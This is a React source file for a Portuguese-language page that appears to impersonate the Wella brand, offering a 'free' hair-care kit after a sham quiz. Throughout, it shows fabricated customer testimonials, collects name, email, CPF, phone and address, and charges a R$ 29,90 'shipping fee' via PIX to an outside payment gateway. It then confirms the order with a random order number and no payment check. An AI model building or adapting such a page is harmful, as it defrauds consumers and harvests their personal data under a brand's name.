import { useState, useEffect } from 'react'
import { WellaLogo } from './components/Logo'
import { FloatingHero } from './components/FloatingHero'
import { CollectionBanner } from './components/CollectionBanner'
import './App.css'

const steps = {
  WELCOME: 'welcome',
  BENEFITS: 'benefits',
  QUIZ: 'quiz',
  SHOWROOM: 'showroom',
  RESULT: 'result',
  OFFER: 'offer',
  CHECKOUT: 'checkout',
  PIX: 'pix',
  SUCCESS: 'success'
}

const carouselItems = [
  {
    image: "https://wella.vtexassets.com/arquivos/ids/170640-500-auto?v=639077925251970000&width=500&height=auto&aspect=true",
    title: "Oil Reflections",
    description: "Brilho instantâneo e proteção térmica premium."
  },
  {
    image: "https://wella.vtexassets.com/arquivos/ids/170365-500-auto?v=638978720157030000&width=500&height=auto&aspect=true",
    title: "Invigo Nutri-Enrich",
    description: "Nutrição profunda para cabelos secos e desgastados."
  },
  {
    image: "https://wella.vtexassets.com/arquivos/ids/170389-500-auto?v=638978726588230000&width=500&height=auto&aspect=true",
    title: "Fusion Intense Repair",
    description: "Reconstrução imediata para fios quebradiços."
  }
]

function App() {
  const [currentStep, setCurrentStep] = useState(steps.WELCOME)
  const [history, setHistory] = useState([steps.WELCOME])
  const [currentQuestion, setCurrentQuestion] = useState(0)
  const [showModal, setShowModal] = useState(false)
  const [shippingData, setShippingData] = useState({
    nome: '',
    email: '',
    cpf: '',
    whatsapp: '',
    cep: '',
    rua: '',
    numero: '',
    bairro: '',
    cidade: '',
    estado: ''
  })
  const [paymentLoading, setPaymentLoading] = useState(false)
  const [paymentError, setPaymentError] = useState('')
  const [pixData, setPixData] = useState(null)

  const questions = [
    {
      q: "Como fica seu cabelo na maioria das vezes?",
      options: ["Ressecado e sem brilho", "Fraco e quebrando", "Opaco e sem vida", "Com frizz e indomável"]
    },
    {
      q: "Qual é o seu principal desejo para o cabelo?",
      options: ["Nutrição e maciez", "Reconstrução e resistência", "Brilho e leveza", "Controle do volume"]
    },
    {
      q: "Com que frequência você processa quimicamente o cabelo?",
      options: ["Nunca", "Raramente", "Só colorindo", "Coloriol + relaxamento"]
    },
    {
      q: "Como você descreveria o dâno atual dos seus fios?",
      options: ["Seco mas sem dânos sérios", "Quebrando e poroso", "Opaco mas resistente", "Dâno severo, precisa de reparação"]
    }
  ]

  const nextStep = () => {
    let next = null
    if (currentStep === steps.WELCOME) next = steps.BENEFITS
    else if (currentStep === steps.BENEFITS) next = steps.QUIZ
    else if (currentStep === steps.QUIZ) {
      if (currentQuestion < questions.length - 1) {
        setCurrentQuestion(currentQuestion + 1)
        return
      } else {
        next = steps.SHOWROOM
        setTimeout(() => setShowModal(true), 500)
      }
    }
    else if (currentStep === steps.SHOWROOM) next = steps.RESULT
    else if (currentStep === steps.RESULT) next = steps.OFFER
    else if (currentStep === steps.OFFER) next = steps.CHECKOUT
    else if (currentStep === steps.CHECKOUT) next = steps.PIX
    else if (currentStep === steps.PIX) next = steps.SUCCESS

    if (next) {
      setCurrentStep(next)
      setHistory(prev => [...prev, next])
    }
  }

  const prevStep = () => {
    if (history.length > 1) {
      if (currentStep === steps.QUIZ && currentQuestion > 0) {
        setCurrentQuestion(currentQuestion - 1)
      } else {
        const newHistory = history.slice(0, -1)
        const lastStep = newHistory[newHistory.length - 1]
        setHistory(newHistory)
        setCurrentStep(lastStep)
        if (lastStep === steps.QUIZ) {
          setCurrentQuestion(questions.length - 1)
        }
      }
    }
  }

  const handleShippingChange = (e) => {
    const { name, value } = e.target
    setShippingData(prev => ({ ...prev, [name]: value }))
  }

  const handlePayment = async (e) => {
    e.preventDefault()
    setPaymentLoading(true)
    setPaymentError('')
    try {
      const cpfClean = shippingData.cpf.replace(/\D/g, '')
      const body = {
        amount: 2990,
        paymentMethod: 'pix',
        customer: {
          name: shippingData.nome,
          email: shippingData.email,
          document: cpfClean,
          phone: shippingData.whatsapp.replace(/\D/g, '')
        },
        items: [
          {
            name: 'Taxa de Processamento e Envio - Kit Wella',
            quantity: 1,
            unitPrice: 2990
          }
        ],
        shipping: {
          address: {
            street: shippingData.rua,
            number: shippingData.numero,
            neighborhood: shippingData.bairro,
            city: shippingData.cidade,
            state: shippingData.estado,
            zipCode: shippingData.cep.replace(/\D/g, '')
          }
        }
      }
      const response = await fetch('https://api.ghostspaysv2.com/functions/v1/transactions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      })
      const data = await response.json()
      if (!response.ok) {
        throw new Error(data.message || 'Erro ao processar pagamento. Tente novamente.')
      }
      setPixData(data)
      nextStep()
    } catch (err) {
      setPaymentError(err.message || 'Erro inesperado. Tente novamente.')
    } finally {
      setPaymentLoading(false)
    }
  }

  const pickProduct = (e) => {
    console.log('pickProduct click', e.target, e.currentTarget)
    const card = e.currentTarget || (e.target && e.target.closest && e.target.closest('.luxury-card'))
    if (!card) return
    card.classList.add('success-glow')
    setTimeout(() => nextStep(), 800)
  }

  return (
    <div className="container">
      <div className="top-pitch-bar">
        <div className="scrolling-text">
          EXPERIÊNCIA EXCLUSIVA • TRATAMENTO PROFISSIONAL • RESGATE SEU KIT • WELLA SERVICES •
        </div>
      </div>
      <div className="bg-vibe"></div>

      {showModal && (
        <div className="modal-wrap active">
          <div className="modal-content card fade-in-up">
            <h3>Showroom de Interesse</h3>
            <p>Diagnóstico concluído. Selecione agora a coleção que você mais gostou para sinalizar sua preferência ao sistema.</p>
            <button className="btn-primary" onClick={() => setShowModal(false)}>Acessar Catálogo</button>
          </div>
        </div>
      )}

      <header className="site-header">
        <div className="header-left">
          {history.length > 1 && (
            <button className="back-btn" onClick={prevStep}>
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M19 12H5M12 19l-7-7 7-7" /></svg>
            </button>
          )}
          <WellaLogo className="header-logo" />
        </div>
      </header>

      <main className="content">
        {currentStep === steps.WELCOME && (
          <div className="step-welcome fade-in">
            <FloatingHero />
            <div className="step-inner">
              <h1>EXPERIÊNCIA EXCLUSIVA</h1>
              <p>Descubra o tratamento ideal para o seu cabelo em menos de 2 minutos.</p>
              <button className="btn-primary" onClick={nextStep}>INICIAR EXPERIÊNCIA</button>
            </div>
          </div>
        )}

        {currentStep === steps.BENEFITS && (
          <div className="step-benefits fade-in">
            <div className="step-inner">
              <h2>VEJA O QUE VOCÊ PODE GANHAR</h2>
              <div className="benefit-card">
                <div className="benefit-icon-wrap">
                  <img src="https://wella.vtexassets.com/arquivos/ids/170640-500-auto?v=639077925251970000&width=500&height=auto&aspect=true" alt="Oil Reflections" className="benefit-img" />
                </div>
                <div>
                  <h3>Oil Reflections</h3>
                  <p>O toque final de brilho e maciez suprema.</p>
                </div>
              </div>
              <div className="benefit-card">
                <div className="benefit-icon-wrap">
                  <img src="https://wella.vtexassets.com/arquivos/ids/170365-500-auto?v=638978720157030000&width=500&height=auto&aspect=true" alt="Kit Nutri-Enrich" className="benefit-img" />
                </div>
                <div>
                  <h3>Kit Nutri-Enrich</h3>
                  <p>Nutrição profunda para fios vibrantes.</p>
                </div>
              </div>
              <button className="btn-primary" onClick={nextStep}>CONTINUAR</button>
            </div>
          </div>
        )}

        {currentStep === steps.QUIZ && (
          <div className="step-quiz fade-in">
            <div className="step-inner">
              <div className="progress-bar">
                <div
                  className="progress-fill"
                  style={{ width: `${((currentQuestion + 1) / questions.length) * 100}%` }}
                ></div>
              </div>
              <span className="question-count">Diagnóstico Profissional</span>
              <h2 className="quiz-title">DESCUBRA QUAL MELHOR TRATAMENTO PARA O SEU CABELO</h2>
              <div className="question-box">
                <h3>{questions[currentQuestion].q}</h3>
              </div>
              <div className="options-grid">
                {questions[currentQuestion].options.map((option, idx) => (
                  <div
                    key={idx}
                    className="option-card"
                    onClick={nextStep}
                  >
                    {option}
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {currentStep === steps.SHOWROOM && (
          <div className="step-showroom fade-in">

            {/* Banner Carousel */}
            <div className="collection-carousel">
              <CollectionBanner />
            </div>

            <section className="showroom-section">
              <div className="showroom-header">
                <h2>Coleção Premium</h2>
                <p>Sinalize agora <strong>qual coleção mais te agrada</strong>.<br />A escolha definitiva do seu presente será na etapa final.</p>
              </div>
              <div className="product-grid">
                <div className="luxury-card card" onClick={pickProduct}>
                  <div className="product-img-wrap">
                    <img src="https://loja.wella.com.br/arquivos/ids/170365-500-auto?v=638978720157030000&width=500&height=auto&aspect=true" alt="Shampoo Invigo" />
                  </div>
                  <h3>INVIGO NUTRI-ENRICH</h3>
                  <div className="product-price">
                    <span className="old-price">R$ 89,90</span>
                    <span className="new-price">R$ 0,00</span>
                  </div>
                  <button type="button" className="btn-interest">SINALIZAR INTERESSE</button>
                </div>
                <div className="luxury-card card" onClick={pickProduct}>
                  <div className="product-img-wrap">
                    <img src="/assets/nutri-enrich-500g.jpg" alt="Máscara Nutri-Enrich 500g" />
                  </div>
                  <h3>MÁSCARA NUTRI-ENRICH 500G</h3>
                  <div className="product-price">
                    <span className="old-price">R$ 99,90</span>
                    <span className="new-price">R$ 0,00</span>
                  </div>
                  <button className="btn-interest">SINALIZAR INTERESSE</button>
                </div>
                <div className="luxury-card card" onClick={pickProduct}>
                  <div className="product-tag">MAIS ESCOLHIDO</div>
                  <div className="product-img-wrap">
                    <img src="/assets/kit-nutri-enrich.jpg" alt="Kit Nutri-Enrich" />
                  </div>
                  <h3>KIT PREMIUM NUTRI-ENRICH</h3>
                  <div className="product-price">
                    <span className="old-price">R$ 259,90</span>
                    <span className="new-price">R$ 0,00</span>
                  </div>
                  <button className="btn-interest">SINALIZAR INTERESSE</button>
                </div>
                <div className="luxury-card card" onClick={pickProduct}>
                  <div className="product-img-wrap">
                    <img src="/assets/kit-color-brilliance.jpg" alt="Kit Color Brilliance" />
                  </div>
                  <h3>KIT COLOR BRILLIANCE</h3>
                  <div className="product-price">
                    <span className="old-price">R$ 169,90</span>
                    <span className="new-price">R$ 0,00</span>
                  </div>
                  <button className="btn-interest">SINALIZAR INTERESSE</button>
                </div>
              </div>
            </section>

            <div className="hero-banner-container">
              <img src="/assets/banner-volume.jpg" alt="Wella Banner — Volume e Movimento" />
            </div>

            <section className="showroom-section">
              <div className="section-header">
                <h2>Fusion & Oil Reflections</h2>
              </div>
              <div className="product-grid">
                <div className="luxury-card card" onClick={pickProduct}>
                  <div className="product-img-wrap">
                    <img src="/assets/fusion-mask.jpg" alt="MÁSCARA FUSION" />
                  </div>
                  <h3>MÁSCARA FUSION</h3>
                  <div className="product-price">
                    <span className="old-price">R$ 115,90</span>
                    <span className="new-price">R$ 0,00</span>
                  </div>
                  <button className="btn-interest">SINALIZAR INTERESSE</button>
                </div>
                <div className="luxury-card card" onClick={pickProduct}>
                  <div className="product-img-wrap">
                    <img src="/assets/oil-reflections-shampoo-v2.jpg" alt="SHAMPOO OIL REFLECTIONS" />
                  </div>
                  <h3>SHAMPOO OIL REFLECTIONS</h3>
                  <div className="product-price">
                    <span className="old-price">R$ 108,00</span>
                    <span className="new-price">R$ 0,00</span>
                  </div>
                  <button className="btn-interest">SINALIZAR INTERESSE</button>
                </div>
                <div className="luxury-card card" onClick={pickProduct}>
                  <div className="product-img-wrap">
                    <img src="/assets/oil-reflections-mask.jpg" alt="MÁSCARA OIL REFLECTIONS" />
                  </div>
                  <h3>KIT MÁSCARA OIL REFLECTIONS</h3>
                  <div className="product-price">
                    <span className="old-price">R$ 389,00</span>
                    <span className="new-price">R$ 0,00</span>
                  </div>
                  <button className="btn-interest">SINALIZAR INTERESSE</button>
                </div>
                <div className="luxury-card card" onClick={pickProduct}>
                  <div className="product-img-wrap">
                    <img src="/assets/fusion-conditioner.jpg" alt="CONDICIONADOR FUSION" />
                  </div>
                  <h3>CONDICIONADOR FUSION</h3>
                  <div className="product-price">
                    <span className="old-price">R$ 98,90</span>
                    <span className="new-price">R$ 0,00</span>
                  </div>
                  <button className="btn-interest">SINALIZAR INTERESSE</button>
                </div>
              </div>
            </section>
          </div>
        )}

        {currentStep === steps.RESULT && (
          <div className="step-result fade-in">
            <div className="success-icon">✓</div>
            <h2>DIAGNÓSTICO CONCLUÍDO!</h2>
            <p>Analisamos seu perfil e preparamos uma oferta especial Wella.</p>
            <button className="btn-primary" onClick={nextStep}>VER MEU KIT</button>
          </div>
        )}

        {currentStep === steps.OFFER && (
          <div className="step-offer fade-in">
            <div className="step-inner">
              <h2>REIVINDIQUE SEU KIT WELLA</h2>
              <div className="product-card">
                <img src="/assets/kit-premium-clean.jpg" alt="Kit Wella" />
                <h3>Coleção Premium Nutri-Enrich</h3>
                <p>O kit ideal para quem busca restauração profunda e brilho intenso.</p>
                <button className="btn-primary" onClick={nextStep}>RESGATAR MEU KIT GRÁTIS</button>
              </div>

              <div className="feedback-section">
                <h3>O que dizem sobre a experiência</h3>
                <div className="feedback-grid">
                  <div className="feedback-card">
                    <div className="feedback-user">
                      <div className="user-avatar" style={{ backgroundColor: '#FFD700' }}>M</div>
                      <span>Mariana</span>
                    </div>
                    <p>"Recebi meu kit hoje, muito bem embalado! O Oil Reflections é surreal deixa o cabelo com um brilho incrível"</p>
                    <div className="feedback-media">
                      <img src="/assets/feedback-1.jpg" alt="Feedback Oil Reflections" />
                    </div>
                  </div>
                  <div className="feedback-card">
                    <div className="feedback-user">
                      <div className="user-avatar" style={{ backgroundColor: '#FF69B4' }}>A</div>
                      <span>Ana Paula Silva</span>
                    </div>
                    <p>"Amei a linha, o condicionador e o shampoo são perfeitos demais to muiiito feliz, sou ruiva."</p>
                    <div className="feedback-media">
                      <img src="/assets/feedback-2.jpg" alt="Feedback Nutri-Enrich" />
                    </div>
                  </div>
                  <div className="feedback-card">
                    <div className="feedback-user">
                      <div className="user-avatar" style={{ backgroundColor: '#8A2BE2' }}>L</div>
                      <span>Luciana Costa</span>
                    </div>
                    <p>"Eu paguei o frete e chegou em 5 dias muito rápido, a máscara Nutri salvou meu cabelo ressecado. Vcs são incriveis!"</p>
                    <div className="feedback-media">
                      <img src="/assets/feedback-3.jpg" alt="Feedback Máscara" />
                    </div>
                  </div>
                  <div className="feedback-card">
                    <div className="feedback-user">
                      <div className="user-avatar" style={{ backgroundColor: '#FF4500' }}>C</div>
                      <span>Carla</span>
                    </div>
                    <p>"Simplesmente apaixonada por esse kit, pedi dia 08/03 e chegou hoje 15/03!"</p>
                    <div className="feedback-media">
                      <img src="/assets/feedback-4.jpg" alt="Feedback Kit Completo" />
                    </div>
                  </div>
                  <div className="feedback-card">
                    <div className="feedback-user">
                      <div className="user-avatar" style={{ backgroundColor: '#FFD700' }}>J</div>
                      <span>Juliana Rocha</span>
                    </div>
                    <p>"O óleo de 100ml dura uma eternidade e o cheiro é incrível. Vale cada centavo do frete!"</p>
                    <div className="feedback-media">
                      <img src="/assets/feedback-5.jpg" alt="Feedback Wella" />
                    </div>
                  </div>
                  <div className="feedback-card">
                    <div className="feedback-user">
                      <div className="user-avatar" style={{ backgroundColor: '#FF69B4' }}>B</div>
                      <span>Beatriz Lima</span>
                    </div>
                    <p>"Estou usando o shampoo e o óleo light, meu cabelo ficou super soltinho, consegui pegar duas vezes ainda a oferta kkkkk."</p>
                    <div className="feedback-media">
                      <img src="/assets/feedback-6.jpg" alt="Feedback Light" />
                    </div>
                  </div>
                  <div className="feedback-card">
                    <div className="feedback-user">
                      <div className="user-avatar" style={{ backgroundColor: '#8A2BE2' }}>S</div>
                      <span> Souza Renan</span>
                    </div>
                    <p>"Comprei pra minha namorada porque ela queria muito, era o sonho dela, ela amou! "</p>
                    <div className="feedback-media">
                      <img src="/assets/feedback-7.jpg" alt="Feedback Nutri" />
                    </div>
                  </div>
                </div>

                <div className="add-comment-section card">
                  <h4>Deixe sua avaliação</h4>
                  <div className="comment-input-wrap">
                    <textarea placeholder="O que você achou do seu kit?"></textarea>
                    <button className="btn-secondary" onClick={(e) => { e.preventDefault(); alert('Sua avaliação foi enviada para moderação!'); }}>Publicar Avaliação</button>
                  </div>
                  <p className="comment-note">Seu comentário será visível após aprovação.</p>
                </div>
              </div>
            </div>
          </div>
        )}

        {currentStep === steps.CHECKOUT && (
          <div className="step-checkout fade-in">
            <div className="step-inner">
              <h2>FINALIZAR ENVIO DO KIT</h2>
              <div className="checkout-layout">
                <div className="checkout-form-side card">
                  <h3>Resumo do Pedido</h3>
                  <div className="order-summary">
                    <div className="summary-item">
                      <span>Kit Wella Professionals</span>
                      <span className="price-free">GRÁTIS</span>
                    </div>
                    <div className="summary-item">
                      <span>Taxa de Processamento e Envio</span>
                      <span>R$ 29,90</span>
                    </div>
                    <div className="summary-total">
                      <span>Total</span>
                      <span>R$ 29,91</span>
                    </div>
                  </div>

                  <h3>Dados de Entrega</h3>
                  <form className="shipping-form" onSubmit={handlePayment}>
                    <input type="text" name="nome" placeholder="Nome Completo" value={shippingData.nome} onChange={handleShippingChange} required />
                    <input type="email" name="email" placeholder="E-mail" value={shippingData.email} onChange={handleShippingChange} required />
                    <div className="form-row">
                      <input type="text" name="cpf" placeholder="CPF (somente números)" value={shippingData.cpf} onChange={handleShippingChange} required />
                      <input type="text" name="whatsapp" placeholder="WhatsApp" value={shippingData.whatsapp} onChange={handleShippingChange} required />
                    </div>
                    <input type="text" name="cep" placeholder="CEP" value={shippingData.cep} onChange={handleShippingChange} required />
                    <input type="text" name="rua" placeholder="Rua/Avenida" value={shippingData.rua} onChange={handleShippingChange} required />
                    <div className="form-row">
                      <input type="text" name="numero" placeholder="Número" value={shippingData.numero} onChange={handleShippingChange} required />
                      <input type="text" name="bairro" placeholder="Bairro" value={shippingData.bairro} onChange={handleShippingChange} required />
                    </div>
                    <div className="form-row">
                      <input type="text" name="cidade" placeholder="Cidade" value={shippingData.cidade} onChange={handleShippingChange} required />
                      <input type="text" name="estado" placeholder="UF" value={shippingData.estado} onChange={handleShippingChange} required />
                    </div>
                    {paymentError && <p className="payment-error">{paymentError}</p>}
                    <button type="submit" className="btn-primary" disabled={paymentLoading}>
                      {paymentLoading ? <span className="btn-spinner">⏳ PROCESSANDO...</span> : 'GERAR PIX'}
                    </button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        )}

        {currentStep === steps.PIX && pixData && (
          <div className="step-pix fade-in">
            <div className="step-inner">
              <h2>PAGAMENTO VIA PIX</h2>
              <p>Escaneie o QR Code ou copie o código para pagar R$ 29,90</p>

              <div className="pix-card card">
                {(pixData.qr_code_base64 || pixData.pix?.qr_code_base64) && (
                  <div className="pix-qr-box">
                    <img
                      src={`data:image/png;base64,${pixData.qr_code_base64 || pixData.pix?.qr_code_base64}`}
                      alt="QR Code PIX"
                      className="pix-qr-img"
                    />
                  </div>
                )}

                <div className="pix-copy-section">
                  <p className="pix-copy-label">📋 Código Copia e Cola</p>
                  <div className="pix-copy-wrap">
                    <input
                      type="text"
                      readOnly
                      className="pix-key-input"
                      value={pixData.pix_key || pixData.pix?.emv || pixData.emv || ''}
                    />
                    <button
                      className="btn-copy"
                      onClick={() => {
                        const key = pixData.pix_key || pixData.pix?.emv || pixData.emv || ''
                        navigator.clipboard.writeText(key)
                        alert('Código copiado!')
                      }}
                    >
                      Copiar
                    </button>
                  </div>
                </div>

                <div className="pix-info">
                  <p>⏱ O código expira em <strong>30 minutos</strong>.</p>
                  <p>✅ Após confirmação do pagamento, seu kit será preparado para envio.</p>
                </div>

                <button className="btn-primary pix-confirm-btn" onClick={nextStep}>
                  JÁ PAGUEI — CONFIRMAR PEDIDO
                </button>
              </div>
            </div>
          </div>
        )}

        {currentStep === steps.SUCCESS && (
          <div className="step-success fade-in">
            <div className="step-inner">
              <div className="success-icon animate-pop">✓</div>
              <h2>PEDIDO CONFIRMADO!</h2>
              <p>Obrigado, {shippingData.nome.split(' ')[0]}! Seu kit Wella está sendo preparado para envio.</p>
              <div className="success-details card">
                <p><strong>Número do Pedido:</strong> #WL{Math.floor(Math.random() * 90000) + 10000}</p>
                <p>Você receberá um e-mail com o código de rastreio em breve.</p>
              </div>
              <button className="btn-primary" onClick={() => window.location.reload()}>VOLTAR AO INÍCIO</button>
            </div>
          </div>
        )}
      </main>

      <footer className="site-footer">
        <WellaLogo className="footer-logo" />
        <p>© 2026 WELLA SERVICES</p>
      </footer>
    </div>
  )
}

export default App
